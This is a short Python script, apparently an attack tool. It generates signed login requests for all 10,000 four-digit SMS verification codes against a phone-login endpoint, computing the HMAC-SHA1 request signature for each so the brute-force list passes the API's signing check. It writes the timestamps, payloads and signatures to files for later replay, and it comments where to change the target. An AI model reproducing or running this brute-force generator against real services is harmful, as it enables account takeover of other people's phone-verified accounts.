# -*- coding:UTF-8 -*-
import base64
import hashlib
import hmac
import datetime

def Get_str(payload):
	hl = hashlib.md5()
	hl.update(payload.encode("utf-8"))
	payload_base64=base64.b64encode(hl.hexdigest().encode(encoding="utf-8")).decode()
	GMT_FORMAT =  '%a, %d %b %Y %H:%M:%S GMT'
	time=datetime.datetime.utcnow().strftime(GMT_FORMAT)

	#修改此处
	return time,"x-date: "+time+"""
POST
application/json
application/json
"""+payload_base64+"""
/login"""

def get_hamc_sha1(message, key):
    message = message.encode()  # 加密内容
    key = key.encode()          # 加密的key
    result = hmac.new(key, message, hashlib.sha1).digest()  # 返回结果：b'\xd5*\x01\xb0\xa4,y\x96\x9d`\xd7\xfcB\xe1\x95OZIe\xe7'
    _sig = base64.b64encode(result).decode()
    return _sig

if __name__ == '__main__':

	key = ""#密匙

	for i in range(0000,9999):

		#修改此处
		payload='{"type":"phone","phone":{"phone":"+8618888888888","code":"'+str(i).zfill(4)+'"}}'
		time,mess = Get_str(payload)
		sign = get_hamc_sha1(mess, key)
		# Authorization='Authorization: hmac id="APID1OI0pbHJ26Tr8M6u57m4zg5Clf84txXwv191", algorithm="hmac-sha1", headers="x-date", signature="'+sign+'"'
		
		with open('time.txt','a') as t:
			t.write(time+'\n')
		with open('payload.txt','a') as p:
			p.write(payload+'\n')
		with open('sign.txt','a') as s:
			s.write(sign+'\n')
